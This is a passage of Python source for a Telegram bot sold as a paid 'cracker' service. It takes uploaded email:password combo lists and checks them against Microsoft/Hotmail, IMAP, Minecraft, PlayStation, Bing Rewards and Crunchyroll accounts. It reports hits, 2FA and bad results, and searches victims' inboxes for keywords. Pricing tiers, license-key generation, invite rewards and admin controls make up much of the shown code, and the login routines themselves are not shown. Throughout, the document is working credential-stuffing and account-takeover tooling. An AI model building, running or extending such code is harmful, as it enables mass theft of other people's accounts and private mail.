            except:
                pass

    async def _show_current_scans(self, query, context: ContextTypes.DEFAULT_TYPE):
        """Show all active scans (regular users) - with error handling"""
        try:
            text = "📊 **ACTIVE SCANS - ALL USERS**\n\n"
            
            if not self.active_scans:
                text += "✅ No active scans at the moment\n\nBe the first to start a scan!"
                try:
                    await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, 
                                                 reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]))
                except Exception as e:
                    logger.warning(f"Error in _show_current_scans (empty): {e}")
                    try:
                        await query.answer("No active scans", show_alert=False)
                    except:
                        pass
                return
            
            text += f"🟢 **Active Scans: {len(self.active_scans)}**\n\n"
            
            for uid, scan_info in list(self.active_scans.items())[:10]:  # Show top 10
                try:
                    stats = scan_info.get('stats')
                    if stats:
                        snap = stats.get_snapshot()
                        user_data = self.key_manager.users.get(str(uid), {})
                        username = user_data.get('username', f'User {uid}')
                        username_safe = username.replace('_', '\\_').replace('*', '\\*').replace('[', '\\[').replace(']', '\\]').replace('`', '\\`')
                        text += f"👤 **{username_safe}**\n"
                        text += f"  ✅ Checked: `{snap['checked']:,}` / `{snap['total']:,}`\n"
                        text += f"  🎯 Hits: `{snap['hits']}`\n"
                        text += f"  ⚡ Speed: `{snap['cpm']}` CPM\n\n"
                except Exception as e:
                    logger.error(f"Error processing scan {uid}: {e}")
                    continue
            
            if len(self.active_scans) > 10:
                text += f"... and {len(self.active_scans) - 10} more scans\n"
            
            # Try to edit message, with fallback
            try:
                await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
                                             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh", callback_data="menu_current_scans")],
                                                                                [InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]))
            except Exception as e:
                logger.warning(f"Error editing in _show_current_scans: {e}")
                # Fallback: send as new message truncated
                try:
                    text_safe = text[:4000] if len(text) > 4000 else text
                    await context.bot.send_message(chat_id=query.message.chat_id, text=text_safe, parse_mode=ParseMode.MARKDOWN)
                except Exception as e2:
                    logger.error(f"Fallback failed in _show_current_scans: {e2}")
                    try:
                        await query.answer("⚠️ Error loading scans", show_alert=True)
                    except:
                        pass
        except Exception as e:
            logger.error(f"Critical error in _show_current_scans: {e}")
            try:
                await query.answer("❌ System error", show_alert=True)
            except:
                pass

    async def _show_cracker_menu(self, query):
        text = f"**🔥 Cracker Menu**\n\nSelect cracking mode:\n\n📧 **Custom Inboxer**\n└ Search specific service in inbox (Hotmail only)\n\n📋 **My Selected Services**\n└ ZIP results with proper naming! ({TOTAL_KEYWORDS}+ services available)\n\n⚡ **Brute Force (Root)**\n└ Fast validation (HIT/2FA/BAD)\n\n⛏️ **MC Cracker**\n└ Full Minecraft account capture\n\n💎 **Rewards Cracker**\n└ Bing Rewards points checker\n\n🎮 **PSN Cracker**\n└ PlayStation account data (separate files: psn_hits.txt / psn_free.txt)\n\n🍿 **Crunchyroll Cracker**\n└ Anime subscription info (⚠️ REQUIRES PROXY)\n\n📧 **IMAP Checker**\n└ Simple validation (fast, no inbox)\n\n📧 **IMAP Inboxer**\n└ Validate + search inbox for multiple keywords\n\n🔥 **Hotmail Bruter**\n└ Accurate Microsoft login\n\n📊 **All modes have LIVE STATS!**\n\n⚠️ **Limits:** Max 10,000 lines | 20MB | Threads limited by your plan\n\n🔄 **Duplicate remover:** Automatically removes duplicate combos from your file before scanning!"
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cracker_keyboard())

    async def _show_profile(self, query, user_id: int):
        is_premium = self.key_manager.is_premium(user_id)
        expiry = self.key_manager.get_premium_expiry(user_id)
        stats = self.key_manager.get_user_stats(user_id)
        daily_used = self.key_manager.get_daily_used(user_id)
        tier = self._get_user_tier(user_id)
        limits = PREMIUM_TIERS[tier]
        status = f"🌟 {limits['name']}" if is_premium else "⭐ FREE"
        expiry_str = expiry.strftime("%Y-%m-%d %H:%M") if expiry else "N/A"
        total_checked = stats.get('total_checked', 0)
        total_hits = stats.get('total_hits', 0)
        success_rate = (total_hits / max(total_checked, 1)) * 100
        text = f"**👤 Your Profile**\n\n**Status:** {status}\n"
        if is_premium:
            text += f"**Expires:** `{expiry_str}`\n**Daily Usage:** `{daily_used}` (Unlimited ✅)\n\n"
        else:
            text += f"**Daily Usage:** `{daily_used}/{limits['daily_limit']}`\n**Max Threads:** `{limits['max_threads']}`\n**Max Services:** `{limits['max_keywords']}`\n**Multi‑scan:** `{limits['multi_scan']}` files\n\n💎 **Upgrade to Premium for:**\n• Higher daily limits\n• More threads\n• Unlimited services\n• No queue waiting\nContact @NoMan8x8 to buy!\n\n"
        text += f"**📊 Statistics:**\n```\nTotal Checked:  {total_checked}\nTotal Hits:     {total_hits}\nSuccess Rate:   {success_rate:.1f}%\n```\n\n**💰 Pricing:**\n• WEEKLY: $8 (15k lines, 150 threads)\n• MONTHLY: $12 (Unlimited, 200 threads)\n• YEARLY: $100 (Unlimited, 250 threads)\n\nUse `/redeem <key>` to activate premium"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("💎 Buy Premium", callback_data="cmd_buy")], [InlineKeyboardButton("🔙 Back", callback_data="menu_main")]])
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=keyboard)

    async def _show_bot_status(self, query):
        uptime = global_stats.get_uptime()
        global_data = self.key_manager.get_global_stats()
        live_data = global_stats.get_stats()
        
        # Count actual active scans from both regular and premium
        actual_active_scans = len(self.active_scans) + len(self.active_premium_scans)
        
        text = f"**📊 Bot Status Dashboard**\n\n```\nSystem Status:     ONLINE 🟢\nVersion:           7.7\nUptime:            {uptime}\n\nActive Scans:      {actual_active_scans}\nTotal Users:       {len(self.key_manager.get_all_users())}\n\nGlobal Statistics:\n  Total Checked:   {global_data['total_checked']}\n  Total Hits:      {global_data['total_hits']}\n  Total 2FA:       {live_data['total_2fa']}\n  Total Bad:       {live_data['total_bad']}\n  MC Hits:         {live_data['total_mc_hits']}\n  Success Rate:    {(global_data['total_hits']/max(global_data['total_checked'],1)*100):.2f}%\n```\n\n**System Info:**\n• Max Threads: Up to 250 (depends on plan)\n• Max File Size: 20MB\n• Max Lines: 10,000\n• Timeout: 15s\n• Live Stats: ✅ Enabled\n• Duplicate Remover: ✅ Automatic\n\n**📁 ZIP Format:**\n`service_domain_at_provider_com.txt`\nExample: `playstation_com.txt`\n\n**👨‍💻 Developer:** @NoMan8x8"
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💎 Buy Premium", callback_data="cmd_buy")], [InlineKeyboardButton("🔄 Refresh", callback_data="menu_status")], [InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]))

    async def _show_invite_rewards(self, query, user_id: int, context: ContextTypes.DEFAULT_TYPE):
        """Display detailed invite rewards GUI"""
        stats = self.key_manager.get_invite_stats(user_id)
        invite_code = stats.get("invite_code", "")
        
        # Generate invite code if not exists
        if not invite_code:
            invite_code = self.key_manager.generate_invite_code(user_id)
        
        invite_count = stats.get("invite_count", 0)
        claimed_tiers = stats.get("claimed_tiers", [])
        
        # Full detailed UI
        text = "🎁 **INVITE & EARN REWARDS**\n\n"
        text += f"👥 **Your Invites:** `{invite_count}`\n\n"
        text += "🔗 **Your Personal Invite Link:**\n"
        text += f"`https://t.me/HotCrackerV7Bot?start=inv_{invite_code}`\n\n"
        text += "📤 **How it works:**\n"
        text += "• Share your link with friends\n"
        text += "• Each new friend who joins = +1 invite\n"
        text += "• Reach milestones to unlock premium rewards\n"
        text += "• Multiple rewards claimable!\n\n"
        
        text += "━━ **REWARD TIERS** ━━\n\n"
        available_count = 0
        
        tiers = [
            (1, 5, 1, "Tier 1"),
            (2, 10, 3, "Tier 2"),
            (3, 25, 7, "Tier 3"),
            (4, 50, 30, "Tier 4 🏆")
        ]
        
        for tier_num, needed, key_days, label in tiers:
            if tier_num in claimed_tiers:
                text += f"✅ {label}: {needed} invites → **{key_days} days** (Claimed)\n"
            elif invite_count >= needed:
                text += f"🎯 {label}: {needed} invites → **{key_days} days** (✓ Ready!)\n"
                available_count += 1
            else:
                progress = int((invite_count / needed) * 100)
                text += f"⏳ {label}: {needed} invites → **{key_days} days** ({progress}%)\n"
        
        text += "\n💡 **Premium Benefits:**\n"
        text += "• Unlimited daily combos\n"
        text += "• Max threads: 250\n"
        text += "• All scanners unlocked\n"
        text += "• Priority support\n"
        
        # Build keyboard
        keyboard = []
        
        # Always show redeem button
        keyboard.append([InlineKeyboardButton("🎁 REDEEM INVITE REWARD", callback_data="redeem_invite_tier")])
        
        keyboard.append([InlineKeyboardButton("📋 Share Link", callback_data="copy_invite_link")])
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="menu_main")])
        
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

    async def _handle_claim_invite_reward(self, query, user_id: int, tier: int, context: ContextTypes.DEFAULT_TYPE):
        """Handle claiming invite reward"""
        success, message, generated_key = self.key_manager.claim_invite_reward(user_id, tier)
        
        if success and generated_key:
            # Redeem the key immediately for the user
            redeem_success, redeem_msg = self.key_manager.redeem_key(user_id, generated_key)
            if redeem_success:
                text = f"🎉 **Reward Claimed Successfully!** ✅\n\n{redeem_msg}\n\n🔑 Key: `{generated_key}`\n\n✨ Premium activated immediately!\n\nUse /start to access all features."
                await query.answer(text, show_alert=True)
            else:
                text = f"✅ **Reward Claimed!**\n\n🔑 Your Key: `{generated_key}`\n\nUse `/redeem {generated_key}` to activate premium."
                await query.answer(text, show_alert=True)
        else:
            await query.answer(f"❌ {message}", show_alert=True)
        
        # Refresh the invite rewards display
        await self._show_invite_rewards(query, user_id, context)

    async def _show_admin_panel(self, query):
        try:
            stats = self.key_manager.get_stats()
            text = f"**👑 Admin Control Panel**\n\n```\nSystem Overview:\n  Total Users:        {stats['total_users']}\n  Premium Active:     {stats.get('current_premium_users', 0)}\n  Total Keys:         {stats['total_keys']}\n  Redeemed:           {stats['redeemed']}\n  Available:          {stats['total_keys'] - stats['redeemed']}\n```\n\nSelect an action:"
            await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_admin_keyboard())
        except Exception as e:
            logger.error(f"Error showing admin panel: {e}")
            await query.edit_message_text("❌ Error loading admin panel. Please try again.", reply_markup=self.get_admin_keyboard())

    # ==================== ADMIN ACTIONS ====================
    async def _handle_admin_action(self, query, data: str, user_id: int, context: ContextTypes.DEFAULT_TYPE):
        action = data.replace("admin_", "")
        hour_map = {"gen_1h": (1/24, "1 Hour"), "gen_3h": (3/24, "3 Hours"), "gen_7h": (7/24, "7 Hours"), "gen_10h": (10/24, "10 Hours")}
        if action in hour_map:
            days, label = hour_map[action]
            key = self.key_manager.generate_key(days)
            await query.edit_message_text(f"**🔑 Key Generated**\n\nType: {label}\nKey: `{key}`\n\nUser can redeem with:\n`/redeem {key}`", parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_admin_keyboard())
            return
        if action == "gen_custom":
            self.user_sessions[user_id] = {"state": "waiting_custom_days"}
            await query.edit_message_text("**⏱️ Custom Key Generation**\n\nEnter number of days:\n• 0.5 = 12 hours\n• 1 = 1 day\n• 7 = 1 week\n• 30 = 1 month\n\nSend the number below:", reply_markup=self.get_cancel_keyboard("menu_admin"))
            return
        if action == "bulk":
            self.user_sessions[user_id] = {"state": "waiting_bulk"}
            await query.edit_message_text("**📦 Bulk Key Generation**\n\nFormat: `count,days`\nExamples:\n• `10,1` - 10 keys, 1 day each\n• `5,7` - 5 keys, 7 days each\n• `20,0.5` - 20 keys, 12 hours each\n\nSend format below:", parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_admin"))
            return
        if action == "add_premium":
            self.user_sessions[user_id] = {"state": "waiting_add_premium"}
            await query.edit_message_text("**➕ Add Premium User**\n\nFormat: `user_id,days`\nExample: `123456789,30`\n\nThis will give user premium for specified days.", parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_admin"))
            return
        if action == "view_users":
            users = self.key_manager.get_all_users()
            if not users:
                await query.edit_message_text("👥 **User List**\n\nNo users found.", parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_admin_keyboard())
                return
            text = "👥 **User List**\n\n"
            for uid_str, user_data in list(users.items())[:50]:
                uid = int(uid_str)
                is_premium = self.key_manager.is_premium(uid)
                expiry = self.key_manager.get_premium_expiry(uid)
                stats = self.key_manager.get_user_stats(uid)
                expiry_str = expiry.strftime("%Y-%m-%d") if expiry else "None"
                status_emoji = "✅" if is_premium else "❌"
                text += f"`{uid}` {status_emoji} | Exp: {expiry_str} | Chk: {stats.get('total_checked',0)} | Hit: {stats.get('total_hits',0)}\n"
                if len(text) > 3800:
                    text += "\n... and more."
                    break
            await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_admin_keyboard())
            return
        if action == "view_keys":
            try:
                keys = self.key_manager.list_all_keys(include_redeemed=True)
                if not keys:
                    text = "No keys found in database."
                else:
                    text = "**📋 Recent Keys (Last 30):**\n\n"
                    for k in keys[-30:]:
                        status = "✅ Used" if k.get("redeemed_by") else "🟢 Available"
                        text += f"`{k['key']}` - {status}\n\n"
                await query.edit_message_text(text[:4000], parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_admin_keyboard())
            except Exception as e:
                logger.error(f"Error viewing keys: {e}")
                await query.edit_message_text(f"❌ Error loading keys: {str(e)}", reply_markup=self.get_admin_keyboard())
            return
        if action == "del_key":
            self.user_sessions[user_id] = {"state": "waiting_del_key"}
            await query.edit_message_text("❌ **Delete Key**\n\nSend the key to delete:", reply_markup=self.get_cancel_keyboard("menu_admin"))
            return
        if action == "del_all":
            await query.edit_message_text("⚠️ **Delete ALL Keys?**\n\nThis action cannot be undone!\n\nType `CONFIRM` to proceed:", reply_markup=self.get_cancel_keyboard("menu_admin"))
            self.user_sessions[user_id] = {"state": "waiting_confirm_del_all"}
            return
        if action == "ban":
            BAN_ADMIN = 8134424193
            if user_id != BAN_ADMIN:
                await query.answer("Only admin 8134424193 can ban users!", show_alert=True)
                return
            self.user_sessions[user_id] = {"state": "waiting_ban_user"}
            await query.edit_message_text("🚫 **Ban User**\n\nSend the user ID to ban:", reply_markup=self.get_cancel_keyboard("menu_admin"))
            return
        if action == "unban":
            BAN_ADMIN = 8134424193
            if user_id != BAN_ADMIN:
                await query.answer("Only admin 8134424193 can unban users!", show_alert=True)
                return
            self.user_sessions[user_id] = {"state": "waiting_unban_user"}
            await query.edit_message_text("✅ **Unban User**\n\nSend the user ID to unban:", reply_markup=self.get_cancel_keyboard("menu_admin"))
            return
        if action == "broadcast":
            BROADCAST_ADMIN = 8134424193
            if user_id != BROADCAST_ADMIN:
                await query.answer("Only admin 8134424193 can broadcast!", show_alert=True)
                return
            self.user_sessions[user_id] = {"state": "waiting_broadcast"}
            await query.edit_message_text("📢 **Broadcast Message**\n\nSend the message to broadcast to all users:", reply_markup=self.get_cancel_keyboard("menu_admin"))
            return
        if action == "view_redeemed":
            try:
                redeemed = self.key_manager.get_redeemed_keys()
                if not redeemed:
                    text = "🔑 **Redeemed Keys**\n\nNo redeemed keys found."
                else:
                    text = "🔑 **Redeemed Keys** (Last 20)\n\n"
                    for k in redeemed[-20:]:
                        redeemed_date = k.get("redeemed_at", "Unknown")
                        if redeemed_date != "Unknown":
                            try:
                                redeemed_dt = datetime.fromisoformat(redeemed_date)
                                redeemed_date = redeemed_dt.strftime("%Y-%m-%d %H:%M")
                            except:
                                pass
                        
                        # Escape special Markdown characters in username
                        username_safe = k.get('username', 'Unknown').replace('_', '\\_').replace('*', '\\*').replace('[', '\\[').replace(']', '\\]')
                        
                        text += f"🔑 `{k['key']}`\n"
                        text += f"👤 {username_safe} (`{k['user_id']}`)\n"
                        text += f"📅 {redeemed_date} | ⏱️ {k.get('duration_days', 0)}d\n"
                        text += "─────────────────\n"
                
                await query.edit_message_text(text[:4000], parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_admin_keyboard())
            except Exception as e:
                logger.error(f"Error viewing redeemed keys: {e}")
                await query.edit_message_text(f"❌ Error loading redeemed keys (check logs)", reply_markup=self.get_admin_keyboard())
            return
        if action == "del_redeemed":
            self.user_sessions[user_id] = {"state": "waiting_del_redeemed_key"}
            await query.edit_message_text("🗑️ **Delete Redeemed Key**\n\n⚠️ WARNING: This will revoke the user's premium access!\n\n**Send the key to delete:**", parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_admin"))
            return
        
        if action == "view_unused":
            try:
                unused = self.key_manager.get_unused_keys()
                if not unused:
                    text = "🔑 **Unused Keys**\n\nNo unused keys found. All generated keys have been redeemed!"
                else:
                    text = f"🔑 **Unused Keys** ({len(unused)} total)\n\n"
                    for k in unused[-20:]:  # Show last 20
                        expiry = k.get("expiry", "Unknown")
                        if expiry != "Unknown":
                            try:
                                exp_dt = datetime.fromisoformat(expiry)
                                expiry = exp_dt.strftime("%Y-%m-%d")
                            except:
                                pass
                        text += f"`{k['key']}`\n"
                        text += f"Duration: {k.get('duration_days', 0)}d | Expires: {expiry}\n"
                        text += "─────\n"
                    text += f"\n💡 Click 'Del Unused' to delete all unused keys"
                
                await query.edit_message_text(text[:4000], parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_admin_keyboard())
            except Exception as e:
                logger.error(f"Error viewing unused keys: {e}")
                await query.edit_message_text(f"❌ Error loading unused keys", reply_markup=self.get_admin_keyboard())
            return
        
        if action == "del_unused":
            try:
                unused = self.key_manager.get_unused_keys()
                if not unused:
                    await query.edit_message_text("✅ No unused keys to delete!", reply_markup=self.get_admin_keyboard())
                    return
                
                count = len(unused)
                deleted = self.key_manager.delete_all_unused_keys()
                await query.edit_message_text(
                    f"✅ **Deleted {deleted} unused keys**\n\n"
                    f"🗑️ Removed keys that were never redeemed\n"
                    f"📊 Freed up {deleted} key slots",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=self.get_admin_keyboard()
                )
            except Exception as e:
                logger.error(f"Error deleting unused keys: {e}")
                await query.edit_message_text(f"❌ Error deleting unused keys", reply_markup=self.get_admin_keyboard())
            return
        
        if action == "start_giveaway":
            GIVEAWAY_ADMIN = 8134424193
            if user_id != GIVEAWAY_ADMIN:
                await query.answer("Only admin can start giveaway!", show_alert=True)
                return
            
            if self.giveaway_manager.is_active():
                await query.answer("⚠️ A giveaway is already active! End it first.", show_alert=True)
                return
            
            self.user_sessions[user_id] = {"state": "waiting_giveaway_keys"}
            await query.edit_message_text(
                "🎁 **Start Giveaway**\n\n"
                "How many keys do you want to give away?\n\n"
                "Examples:\n• 4 keys\n• 5 keys\n• 10 keys\n\n"
                "Send the number (4-10 recommended):",
                reply_markup=self.get_cancel_keyboard("menu_admin")
            )
            return
        
        if action == "end_giveaway":
            GIVEAWAY_ADMIN = 8134424193
            if user_id != GIVEAWAY_ADMIN:
                await query.answer("Only admin can end giveaway!", show_alert=True)
                return
            
            if not self.giveaway_manager.is_active():
                await query.answer("❌ No active giveaway to end!", show_alert=True)
                return
            
            # End giveaway and select winners
            winners = self.giveaway_manager.end_giveaway()
            participant_count = len(self.giveaway_manager.get_participants())
            
            text = f"🏆 **GIVEAWAY ENDED** 🏆\n\n"
            text += f"📊 **Statistics:**\n"
            text += f"• Participants: {participant_count}\n"
            text += f"• Winners: {len(winners)}\n\n"
            
            if winners:
                text += "🎉 **Winners Announced!**\n\n"
                for i, winner in enumerate(winners, 1):
                    text += f"{i}. @{winner.get('username', 'Unknown')} - `{winner['user_id']}`\n"
                    text += f"   Key: `{winner['key']}`\n\n"
                
                # Broadcast to winners
                await self._broadcast_giveaway_winners(winners, context)
                text += "\n✅ Winners notified in DM with their keys!"
            else:
                text += "❌ No winners selected (not enough participants)"
            
            # Reset giveaway for next one
            self.giveaway_manager.reset()
            
            await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_admin_keyboard())
            return
        
        if action == "free_gift":
            BAN_ADMIN = 8134424193
            if user_id != BAN_ADMIN:
                await query.answer("Only admin 8134424193 can send free gift lines!", show_alert=True)
                return
            self.user_sessions[user_id] = {"state": "waiting_gift_lines"}
            await query.edit_message_text(
                "🎁 **Send Free Gift Lines to All Users**\n\n"
                "How many lines do you want to give each user?\n\n"
                "Examples:\n• 5000\n• 10000\n• 15000\n\n"
                "Send the number below:",
                reply_markup=self.get_cancel_keyboard("menu_admin")
            )
            return

    # ==================== DOCUMENT HANDLER ====================
    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not update.message or not update.effective_user:
            return
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        session = self.user_sessions.get(user_id, {})
        state = session.get("state")
        
        # ==================== FILE SIZE VALIDATION ====================
        MAX_FILE_SIZE_MB = 10
        MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_MB * 1024 * 1024
        
        file_size = update.message.document.file_size
        if file_size and file_size > MAX_FILE_SIZE_BYTES:
            await update.message.reply_text(
                f"❌ **File Too Large!**\n\n"
                f"📊 Your file: {file_size / (1024 * 1024):.1f} MB\n"
                f"📏 Max allowed: {MAX_FILE_SIZE_MB} MB\n\n"
                f"Please upload a smaller file or split it into multiple files.",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        # ==================== KEYWORD INBOX FILE HANDLER ====================
        ki_mode = session.get("ki_mode")
        if ki_mode in ["keywords_upload", "combos_upload"]:
            try:
                file = await context.bot.get_file(update.message.document.file_id)
                content = await file.download_as_bytearray()
                text = content.decode('utf-8', errors='ignore')
                
                if ki_mode == "keywords_upload":
                    # Parse keywords (one per line, no colons needed, skip comments)
                    keywords = [line.strip().lower() for line in text.split('\n') 
                               if line.strip() and not line.startswith('#') 
                               and not line.startswith('//')]
                    
                    if not keywords:
                        await update.message.reply_text("❌ No keywords found in file! Please check format.")
                        return
                    
                    self.user_sessions[user_id]["ki_keywords"] = keywords
                    self.user_sessions[user_id]["ki_step"] = "combos"
                    
                    await update.message.reply_text(
                        f"✅ *Keywords Loaded Successfully!*\n\n"
                        f"📊 Total: {len(keywords)}\n"
                        f"📝 Sample: {', '.join(keywords[:10])}{'...' if len(keywords) > 10 else ''}\n\n"
                        f"Next: Choose combos input method",
                        parse_mode="Markdown",
                        reply_markup=InlineKeyboardMarkup([[
                            InlineKeyboardButton("📁 Upload Combos", callback_data="ki_upload_combos"),
                            InlineKeyboardButton("📝 Manual Combos", callback_data="ki_manual_combos")
                        ]])
                    )
                    return
                
                elif ki_mode == "combos_upload":
                    # Parse combos (email:password format ONLY)
                    combos = [line.strip() for line in text.split('\n') 
                             if ':' in line.strip() and line.count(':') >= 1]
                    
                    if not combos:
                        await update.message.reply_text(
                            "❌ No valid combos found!\n\n"
                            "Required format: `email:password`\n"
                            "One combo per line",
                            parse_mode="Markdown"
                        )
                        return
                    
                    self.user_sessions[user_id]["ki_combos"] = combos
                    keywords = self.user_sessions.get(user_id, {}).get("ki_keywords", [])
                    
                    await update.message.reply_text(
                        f"✅ *Combos Loaded Successfully!*\n\n"
                        f"📊 Total combos: {len(combos)}\n"
                        f"📋 Keywords: {len(keywords)}\n\n"
                        f"✨ Ready to scan!",
                        parse_mode="Markdown",
                        reply_markup=InlineKeyboardMarkup([[
                            InlineKeyboardButton("🚀 Start Scan", callback_data="ki_start_scan"),
                            InlineKeyboardButton("📝 Change Keywords", callback_data="ki_redo_keywords"),
                            InlineKeyboardButton("❌ Cancel", callback_data="ki_cancel")
                        ]])
                    )
                    return
            except Exception as e:
                logger.error(f"Keyword inbox file error: {e}")
                await update.message.reply_text(f"❌ Error reading file: {str(e)[:100]}\n\nMake sure file is valid UTF-8 text format.")
                return

        if not state:
            last_state = session.get("last_cracker_state")
            last_time = session.get("last_cracker_state_time")
            if last_state and last_time and time.time() - last_time < 3600:
                state = last_state
                session["state"] = state
            else:
                # ==================== MULTI-FILE MERGE MODE ====================
                # Collect multiple file uploads (3 second window to add more files)
                try:
                    file = await context.bot.get_file(update.message.document.file_id)
                    content = await file.download_as_bytearray()
                    text = content.decode('utf-8', errors='ignore')
                    lines = [line.strip() for line in text.split('\n') if ':' in line and line.strip()]
                    if not lines:
                        await update.message.reply_text("❌ No valid combos found in file.\nFormat: `email:password`", parse_mode=ParseMode.MARKDOWN)
                        return
                    
                    # Initialize multi-file collection if not already started
                    if "multi_files_buffer" not in self.user_sessions[user_id]:
                        self.user_sessions[user_id]["multi_files_buffer"] = []
                        self.user_sessions[user_id]["multi_files_start_time"] = time.time()
                        await update.message.reply_text("📁 **File received!**\n\n⏳ Waiting 3 seconds for more files...\n💡 Tip: Upload multiple files at once to merge them!", parse_mode=ParseMode.MARKDOWN)
                    
                    # Add this file to buffer
                    self.user_sessions[user_id]["multi_files_buffer"].append(lines)
                    file_count = len(self.user_sessions[user_id]["multi_files_buffer"])
                    await update.message.reply_text(f"📁 File {file_count} added! (Total combos so far: {sum(len(f) for f in self.user_sessions[user_id]['multi_files_buffer'])})", parse_mode=ParseMode.MARKDOWN)
                    
                    # Schedule merge after 3 seconds
                    async def process_merged_files():
                        await asyncio.sleep(3)
                        if user_id in self.user_sessions and "multi_files_buffer" in self.user_sessions[user_id]:
                            merged_buffer = self.user_sessions[user_id]["multi_files_buffer"]
                            if merged_buffer:
                                all_lines = []
                                for file_lines in merged_buffer:
                                    all_lines.extend(file_lines)
                                
                                unique_lines, removed_count = remove_duplicates(all_lines)
                                max_lines = 10000
                                if len(unique_lines) > max_lines:
                                    unique_lines = unique_lines[:max_lines]
                                
                                temp_dir = tempfile.gettempdir()
                                temp_path = os.path.join(temp_dir, f"pending_{user_id}_{int(time.time())}.txt")
                                with open(temp_path, 'w', encoding='utf-8') as f:
                                    f.write("\n".join(unique_lines))
                                
                                self.pending_files[user_id] = {'file_path': temp_path, 'lines': unique_lines, 'timestamp': time.time()}
                                
                                # Clear buffer
                                del self.user_sessions[user_id]["multi_files_buffer"]
                                del self.user_sessions[user_id]["multi_files_start_time"]
                                
                                keyboard = InlineKeyboardMarkup([
                                    [InlineKeyboardButton("📋 Preloaded", callback_data="crack_preloaded"), InlineKeyboardButton("⚡ Brute", callback_data="crack_brute")],
                                    [InlineKeyboardButton("💎 Rewards", callback_data="crack_rewards"), InlineKeyboardButton("🎮 PSN", callback_data="crack_psn")],
                                    [InlineKeyboardButton("📧 IMAP", callback_data="crack_imap"), InlineKeyboardButton("📧 IMAP Inboxer", callback_data="crack_imap_inboxer")],
                                    [InlineKeyboardButton("🔥 Hotmail Bruter", callback_data="crack_hotmail_bruter"), InlineKeyboardButton("🌍 Country", callback_data="crack_country")],
                                    [InlineKeyboardButton("❌ Cancel", callback_data="menu_main")]
                                ])
                                await context.bot.send_message(
                                    chat_id=chat_id,
                                    text=f"✅ **{len(merged_buffer)} files merged!**\n\n📊 Total combos: {len(unique_lines):,}\n🔄 Duplicates removed: {removed_count}\n\n**Select cracker mode:**\n• 📋 Preloaded – uses your selected services\n• ⚡ Brute – fast validation\n• 💎 Rewards – Bing points checker\n• 🎮 PSN – PlayStation account data\n• 📧 IMAP – Fast validation only\n• 📧 IMAP Inboxer – Search inbox for keywords\n• 🔥 Hotmail Bruter – Microsoft login\n• 🌍 Country Cracker – Filter by country\n\n⚠️ *For Preloaded mode, make sure you have selected services first!*",
                                    parse_mode=ParseMode.MARKDOWN,
                                    reply_markup=keyboard
                                )
                    
                    asyncio.create_task(process_merged_files())
                    return
                    
                except FileError as fe:
                    logger.error(f"File content error for user {user_id}: {fe}")
                    await update.message.reply_text("❌ **Error reading file**\n\nMake sure the file is in text format (TXT) and properly formatted.\nFormat required: `email:password` (one per line)", parse_mode=ParseMode.MARKDOWN)
                    return
                except Exception as e:
                    error_msg = handle_error(e, "File handling without state", user_id)
                    await update.message.reply_text(error_msg, parse_mode=ParseMode.MARKDOWN)
                    return

        session["chat_id"] = chat_id
        try:
            file = await context.bot.get_file(update.message.document.file_id)
            content = await file.download_as_bytearray()
            text = content.decode('utf-8', errors='ignore')
            lines = [line.strip() for line in text.split('\n') if ':' in line and line.strip()]
            if not lines:
                await update.message.reply_text("❌ No valid combos found in file.\nFormat: `email:password`", parse_mode=ParseMode.MARKDOWN)
                return
            unique_lines, removed_count = remove_duplicates(lines)
            if removed_count > 0:
                await update.message.reply_text(f"🔄 Duplicate remover: Removed {removed_count} duplicate combos. {len(unique_lines)} unique combos remaining.", parse_mode=ParseMode.MARKDOWN)
            max_lines = 10000
            if len(unique_lines) > max_lines:
                unique_lines = unique_lines[:max_lines]
                await update.message.reply_text(f"⚠️ Limited to {max_lines} lines (file had more)", parse_mode=ParseMode.MARKDOWN)

            if state == "waiting_preloaded_file":
                keywords = session.get("selected_actual_keywords", [])
                if not keywords:
                    await update.message.reply_text("❌ No services selected! Go back and select services first.", parse_mode=ParseMode.MARKDOWN)
                    return
                session["state"] = None
                await update.message.reply_text(f"🚀 **Starting Preloaded Scan**\n\n📊 Combos: {len(unique_lines):,}\n🔑 Services: {len(keywords)} selected\n⚡ Threads: 30\n🔄 Duplicates removed: {removed_count}\n\n📁 Results: ZIP with files named by service domain\n\nUse /live to view real-time stats!", parse_mode=ParseMode.MARKDOWN)
                asyncio.create_task(self._start_preloaded_scan(user_id, unique_lines, keywords, 30, context))
            elif state == "waiting_brute_file":
                session["state"] = None
                await update.message.reply_text(f"⚡ **Starting Brute Force**\n\n📊 Combos: {len(unique_lines):,}\n⚡ Threads: 30\n🔄 Duplicates removed: {removed_count}\n\nUse /live to view real-time stats!", parse_mode=ParseMode.MARKDOWN)
                asyncio.create_task(self._start_brute_scan(user_id, unique_lines, 30, context))
